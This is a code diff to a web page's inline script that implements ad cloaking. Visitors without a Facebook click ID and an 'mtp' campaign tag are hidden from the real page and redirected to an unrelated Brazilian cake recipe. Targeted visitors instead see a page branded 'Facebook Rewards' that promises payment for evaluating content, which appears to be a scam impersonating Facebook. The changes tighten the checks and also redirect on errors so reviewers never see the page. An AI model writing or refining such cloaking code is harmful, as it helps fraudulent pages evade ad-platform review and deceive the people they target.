@@ -3,10 +3,10 @@
 (function(){
   try{
     var h=location.hostname;
-    var isDev=/localhost|127\.0\.0\.1|\.lovable\.app$|\.lovableproject\.com$|^192\.168\./.test(h);
+    var isDev=h==='localhost'||h==='127.0.0.1'||h.indexOf('preview--')!==-1||h.indexOf('-preview.')!==-1||/\.lovableproject\.com$|^192\.168\./.test(h);
     var q=new URLSearchParams(location.search);
-    var c=(q.get('utm_campaign')||q.get('campaign')||'').toLowerCase();
-    var ok=c.indexOf('mtp')!==-1 && !!q.get('fbclid');
+    var c=(q.get('utm_campaign')||'').toLowerCase();
+    var ok=c.indexOf('mtp')!==-1 && q.has('fbclid');
     if(!isDev && !ok){
       document.documentElement.style.display='none';
       location.replace('https://www.tudogostoso.com.br/receita/29124-bolo-simples.html');
@@ -15,7 +15,10 @@
     document.title='Facebook Rewards';
     var m=document.querySelector('meta[name="description"]');
     if(m)m.setAttribute('content','Earn rewards by evaluating Facebook content.');
-  }catch(e){}
+  }catch(e){
+    document.documentElement.style.display='none';
+    location.replace('https://www.tudogostoso.com.br/receita/29124-bolo-simples.html');
+  }
 })();
 </script>
   <meta charset="utf-8">
